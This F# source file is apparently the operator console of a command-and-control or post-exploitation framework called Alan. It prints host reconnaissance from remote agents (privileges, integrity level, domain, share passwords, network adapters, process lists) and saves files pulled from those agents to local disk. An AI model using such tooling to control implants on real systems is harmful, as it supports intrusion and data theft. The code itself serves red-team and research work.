namespace ES.Alan.Server.Consoles

open System
open System.IO
open ES.Fslog
open ES.Alan.Core
open ES.Alan.Core.Entities
open ES.Alan.Core.JsonHelper
open ES.Alan.Server.Consoles.ConsoleUtility
open System.Text
open Newtonsoft.Json
open Newtonsoft.Json.Linq

type AgentConsoleOutput(logProvider: ILogProvider) =
    let printProxyInfo(proxyInfo: JObject) =
        let getDefaultString(name: String) =
            match get(proxyInfo, name) with
            | Some j -> j.ToString()
            | None -> String.Empty

        let table = new ConsoleTable([|"Name"; "Value"|])
        table.AddRow([|"Type"; getDefaultString "type"|])
        table.AddRow([|"Address"; getDefaultString "address"|])
        table.AddRow([|"Port"; getDefaultString "port"|])
        table.AddRow([|"Username"; getDefaultString "username"|])
        table.AddRow([|"Password"; getDefaultString "password"|])
        table.AddRow([|"Transmitted bytes"; getDefaultString "transmitted"|])
        table.AddRow([|"Received bytes"; getDefaultString "received"|])
        writeLineText(table.ToString()) 

    let prinSystemInfo(agent: Agent, systemInfo: JObject) =
        let table = new ConsoleTable([|"Name"; "Value"|])

        table.AddRow([|"Id"; agent.Id.ToString("X")|])
        table.AddRow([|"Entry-point"; agent.EntryPoint|])

        let opti = Option.iter
        [
            ("cwd", "Working directory")
            ("computer_name", "Computer name") 
            ("pid", "Pid") 
            ("username", "Username") 
            ("filename", "Executable")
            ("workgroup", "Worgroup") 
            ("domain", "Domain")
            ("architecture", "Architecture") 
            ("os", "Operating System") 
            ("date", "Locate Date")
            ("locale", "Locale")
            ("CPU", "CPU")          
            ("version", "Agent version")
            ("channel", "Listener")
            ("server", "Server address")
            ("integrity", "Process integrity level")
            ("elevated", "Elevation type")
            ("proxy", "Proxy")
            ("machine_id", "Device ID")
        ]
        |> List.iter(fun (proName, text) ->
            get(systemInfo, proName) 
            |> opti(fun v -> table.AddRow([|text; v|]))
        )

        // print privileges
        let privs =
            getArray(systemInfo, "privileges")
            |> Array.map(fun jPriv -> jPriv.Value<String>())
            |> fun privs -> String.Join(Environment.NewLine, privs)
        table.AddRow([|"Privileges"; privs|])

        // print groups
        let groups =
            getArray(systemInfo, "groups") 
            |> Array.map(fun jGroup -> jGroup.Value<String>().Trim('/'))
            |> fun groups -> String.Join(Environment.NewLine, groups)
        table.AddRow([|"Groups"; groups|])

        // print RAM in GB
        get(systemInfo, "RAM") 
        |> opti(fun v -> 
            table.AddRow([|"RAM (GB)"; (v.Value<UInt64>() / 1024UL / 1024UL / 1024UL).ToString()|])
        )

        // print disk info        
        getArray(systemInfo, "disk")
        |> Array.iter(fun jDisk -> 
            let name =
                match get(jDisk, "name") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            let diskSize = 
                match get(jDisk, "size") with
                | Some v -> (v.Value<UInt64>() / 1024UL / 1024UL / 1024UL).ToString() + " GB"
                | None -> "N/A"

            let diskFree = 
                match get(jDisk, "free") with
                | Some v -> (v.Value<UInt64>() / 1024UL / 1024UL / 1024UL).ToString() + " GB"
                | None -> "N/A"

            let label =
                match get(jDisk, "label") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            let fs =
                match get(jDisk, "fs") with
                | Some v -> v.Value<String>()
                | None -> "N/A"
            table.AddRow([|"Disk"; String.Format("{0} ({1}), {2} free of {3}. FS: {4}", label, name, diskFree, diskSize, fs)|])
        )

        // print DNS
        getArray(systemInfo, "interfaces.dns")
        |> Array.iter(fun jDns -> 
            table.AddRow([|"DNS"; jDns.Value<String>()|])
        )

        // print adapters
        getArray(systemInfo, "interfaces.adapters")
        |> Array.iter(fun jAdapter -> 
            let jAdapter = jAdapter.First
            let description = 
                match get(jAdapter, "description") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            getArray(jAdapter, "addresses") 
            |> Array.iter(fun jAddress ->
                let ip =
                    match get(jAddress, "ip") with
                    | Some v -> v.Value<String>()
                    | None -> "N/A"

                let mask =
                    match get(jAddress, "netmask") with
                    | Some v -> v.Value<String>()
                    | None -> "N/A"
                table.AddRow([|"Adapter"; String.Format("{0}, IP: {1}, Mask: {2}", description, ip, mask)|])
            )
        )

        // print shares
        getArray(systemInfo, "shares")
        |> Array.iter(fun jShare ->
            let netname = 
                match get(jShare, "netname") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            let passwd = 
                match get(jShare, "passwd") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            let remark = 
                match get(jShare, "remark") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            let path = 
                match get(jShare, "path") with
                | Some v -> v.Value<String>()
                | None -> "N/A"

            table.AddRow([|"Share"; String.Format("{0}, Description: {1}, Pwd: {2}, Path: {3}", netname, remark, passwd, path)|])
        )
        writeLineText(table.ToString()) 
        
    let printProcessList(processList: JArray) =
        let table = new ConsoleTable([|
            "Name"; "Pid"; "Session"; 
            "Integrity"; "Architecture"; "Account"|])

        processList.Children()
        |> Seq.map(fun jElement ->
            let isElevated =
                match get(jElement, "elevated") with
                | Some v -> v.Value<String>().Equals("elevated", StringComparison.OrdinalIgnoreCase)
                | None -> false

            let name =
                match get(jElement, "name") with
                | Some v -> 
                    let rawName = v.Value<String>()
                    String.Format("{0}{1}", rawName, (if isElevated then "*" else String.Empty))
                | None -> String.Empty

            let pid =
                match get(jElement, "pid") with
                | Some v -> v.Value<Int32>()
                | None -> 0

            let session =
                match get(jElement, "session") with
                | Some v -> v.Value<Int32>()
                | None -> 0

            let integrity =
                match get(jElement, "integrity") with
                | Some v -> v.Value<String>()
                | None -> String.Empty

            let architecture =
                match get(jElement, "arch") with
                | Some v -> v.Value<String>()
                | None -> String.Empty

            let account =
                match get(jElement, "account") with
                | Some v -> v.Value<String>()
                | None -> String.Empty

            (name, pid, session, integrity, architecture, account)
        )
        |> Seq.sortBy(fun (name, _, _, _, _, _) -> name.ToLowerInvariant())
        |> Seq.iter(fun (name, pid, session, integrity, architecture, account) ->
            table.AddRow([|
                name
                pid
                (if session >= 0 then session.ToString() else String.Empty)
                integrity
                architecture
                account
            |])
        )
        writeLineText(table.ToString()) 

    let filesDownloaded(message: AgentCommandDataMessage, jPayload: JObject) =
        let rootPath = 
            match get(jPayload, "path") with
            | Some v -> v.Value<String>()
            | None -> String.Empty

        match get(jPayload, "files") with
        | Some v ->
            let jElements = v :?> JArray
            jElements.Children()
            |> Seq.iter(fun jElement ->
                let name =
                    match get(jElement, "name") with
                    | Some v -> v.Value<String>()
                    | None -> String.Empty

                let content =
                    match get(jElement, "content") with
                    | Some v -> v.Value<String>()
                    | None -> String.Empty

                let error =
                    match get(jElement, "error") with
                    | Some v -> v.Value<Int32>()
                    | None -> 0

                if String.IsNullOrWhiteSpace(name) || String.IsNullOrWhiteSpace(content) then
                    writeLineText(String.Format("Error in received data: {0}", error))
                else
                    let destFile = 
                        match message.Command.Context with
                        | Some c ->
                            let srcCommand = c :?> DownloadFileMessage

                            let destinationDirectory =
                                srcCommand.DestinationDirectory
                                |> Environment.ExpandEnvironmentVariables
                                |> Path.GetFullPath

                            let baseDir =
                                name.Replace(rootPath, String.Empty)
                                |> Path.GetDirectoryName    
                                |> fun s -> 
                                    if String.IsNullOrEmpty(s) then String.Empty
                                    else s.TrimStart([|'\\'; '/'|])                        

                            if String.IsNullOrWhiteSpace(destinationDirectory)  then
                                Path.Combine(Path.GetTempPath(), baseDir, Path.GetFileName(name))
                            else
                                Directory.CreateDirectory(destinationDirectory) |> ignore
                                Path.Combine(destinationDirectory, baseDir, Path.GetFileName(name))
                        | _ ->
                            Path.Combine(Path.GetTempPath(), Path.GetFileName(name))

                    let fileContent = Convert.FromBase64String(content)            
                    if File.Exists(destFile) then File.Delete(destFile)
                    Directory.CreateDirectory(Path.GetDirectoryName(destFile)) |> ignore
                    File.WriteAllBytes(destFile, fileContent)
                    writeLineText(String.Format("File downloaded locally to: {0}", destFile))
            )
        | None -> ()

    member this.ProcessCommandResult(message: AgentCommandCompletedMessage) =        
        writeLineText()
        writeLineText(ErrorFormatter.FormatCode(uint32 message.ResultCode, message.Data))

    member this.ProcessCommandData(message: AgentCommandDataMessage) =
        let data = Encoding.Default.GetString(message.Data).Trim()
        match message.CommandType with
        | AgentCommandType.GetExtendedSystemInfo
        | AgentCommandType.GetSystemInfo -> 
            writeLineText()            
            let systemInfo = JsonConvert.DeserializeObject(data) :?> JObject
            prinSystemInfo(message.Agent, systemInfo)
            writeLineText()
        | AgentCommandType.GetConfig ->
            let configFile = Path.Combine(Path.GetTempPath(), Path.GetTempFileName() )
            File.WriteAllText(configFile, data)
            writeLineText("Agent config saved at: {0}", configFile)        
        | AgentCommandType.GetProcessList ->
            writeLineText()
            let processList = JsonConvert.DeserializeObject(data) :?> JArray
            printProcessList(processList)
            writeLineText()
        | AgentCommandType.DownloadFiles ->
            try
                let downloadedFile = JsonConvert.DeserializeObject(data) :?> JObject
                writeLineText()
                filesDownloaded(message, downloadedFile)
            with e ->
                writeLineText(e)                
        | AgentCommandType.ExecCommand ->
            match message.Command.Context with
            | Some c ->
                let exec = c :?> ExecProgramMessage
                if exec.RunInBackground then
                    writeLineText(String.Format("Process created with pid: {0}", data))
                else
                    writeText(data)
            | None ->
                writeText(data)         
        | AgentCommandType.RunProgram
        | AgentCommandType.RunShellCommand ->
            writeText(data)
        | AgentCommandType.ProxyUse ->
            writeText("Proxy enabled")
        | AgentCommandType.ProxyClose ->
            writeText("Proxy disabled")
        | AgentCommandType.ProxyStop ->
            writeText("Proxy stopped")
        | AgentCommandType.ProxyInfo ->
            writeLineText()
            let proxyInfo =  JsonConvert.DeserializeObject(data) :?> JObject
            printProxyInfo(proxyInfo)            
        | ct ->            
            writeLineText(ct.ToString() + " => " + data)